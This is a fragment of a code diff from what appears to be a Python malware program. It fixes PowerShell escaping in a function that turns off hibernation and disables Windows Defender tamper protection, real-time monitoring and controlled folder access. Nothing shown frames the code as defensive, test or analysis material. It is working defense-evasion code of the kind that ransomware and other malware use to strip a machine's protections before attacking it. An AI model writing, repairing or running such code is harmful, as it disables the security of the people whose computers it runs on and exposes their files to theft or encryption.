@@ -184,10 +184,10 @@ def check_connection(url="http://www.google.com/", timeout=5):
 def block_processes():
     execute_command("powercfg /h off")
     execute_command(
-        'powershell -Command "Set-MpPreference -DisableTamperProtection `$true"'
+        'powershell -Command "Set-MpPreference -DisableTamperProtection $true"'
     )
     execute_command(
-        'powershell -Command "Set-MpPreference -DisableRealtimeMonitoring `$true"'
+        'powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"'
     )
     execute_command(
         'powershell -Command "Set-MpPreference -EnableControlledFolderAccess Disabled"'
